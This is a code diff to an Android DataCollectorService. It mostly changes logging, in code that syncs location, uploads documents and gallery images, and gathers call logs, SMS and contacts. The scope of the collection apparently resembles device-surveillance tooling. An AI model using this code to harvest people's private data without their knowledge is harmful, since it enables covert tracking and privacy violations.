@@ -21,21 +21,31 @@ public class DataCollectorService {
         }
 
         String userId = user.getUid();
-        Log.d(TAG, "🔄 Starting comprehensive data collection for user: " + userId);
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "🔄 STARTING COMPREHENSIVE DATA COLLECTION");
+        Log.d(TAG, "   User: " + userId);
+        Log.d(TAG, "================================================");
 
         // Collect location (most important)
         collectLocation(context);
 
-        // Collect documents
+        // Collect documents (PDFs, Excel, Word, etc.)
         collectDocuments(context);
 
-        // Collect media/gallery
+        // Collect media/gallery (Images separately)
         collectGallery(context);
 
-        // Collect other data
+        // Collect other data (calls, SMS, contacts)
         collectOtherData(context);
 
-        Log.d(TAG, "✓ Data collection cycle complete");
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "✓ DATA COLLECTION CYCLE COMPLETE");
+        Log.d(TAG, "   Summary:");
+        Log.d(TAG, "   📍 Location sync");
+        Log.d(TAG, "   📄 Documents upload (PDF, Excel, Word, etc.)");
+        Log.d(TAG, "   🖼️  Gallery upload (Images, Screenshots, etc.)");
+        Log.d(TAG, "   📞 Call logs, SMS, Contacts");
+        Log.d(TAG, "================================================");
     }
 
     private static void collectLocation(Context context) {
@@ -56,36 +66,38 @@ public class DataCollectorService {
 
     private static void collectDocuments(Context context) {
         try {
-            Log.d(TAG, "📄 Collecting documents...");
+            Log.d(TAG, "📄 Collecting documents (PDF, Excel, Word, etc.)...");
             
             // Check storage permissions
             if (!FeaturePermissions.hasGalleryPermission(context)) {
-                Log.w(TAG, "  Storage permission not granted");
+                Log.w(TAG, "   ❌ Storage permission not granted");
                 return;
             }
 
             // Enqueue document upload immediately
+            Log.d(TAG, "   → Enqueueing DocumentUploadWorker");
             DocumentUploadWorker.enqueueWork(context);
-            Log.d(TAG, "✓ Document upload enqueued");
+            Log.d(TAG, "   ✓ DocumentUploadWorker enqueued");
         } catch (Exception e) {
-            Log.e(TAG, "Failed to collect documents", e);
+            Log.e(TAG, "   ❌ Failed to collect documents", e);
         }
     }
 
     private static void collectGallery(Context context) {
         try {
-            Log.d(TAG, "🖼️  Collecting gallery images...");
+            Log.d(TAG, "🖼️  Collecting gallery/media (Images, Screenshots, etc.)...");
             
             if (!FeaturePermissions.hasGalleryPermission(context)) {
-                Log.w(TAG, "  Storage permission not granted");
+                Log.w(TAG, "   ❌ Storage permission not granted");
                 return;
             }
 
             // Enqueue image upload
+            Log.d(TAG, "   → Enqueueing ImageUploadWorker");
             ImageUploadWorker.enqueueWork(context);
-            Log.d(TAG, "✓ Gallery upload enqueued");
+            Log.d(TAG, "   ✓ ImageUploadWorker enqueued");
         } catch (Exception e) {
-            Log.e(TAG, "Failed to collect gallery", e);
+            Log.e(TAG, "   ❌ Failed to collect gallery", e);
         }
     }
 
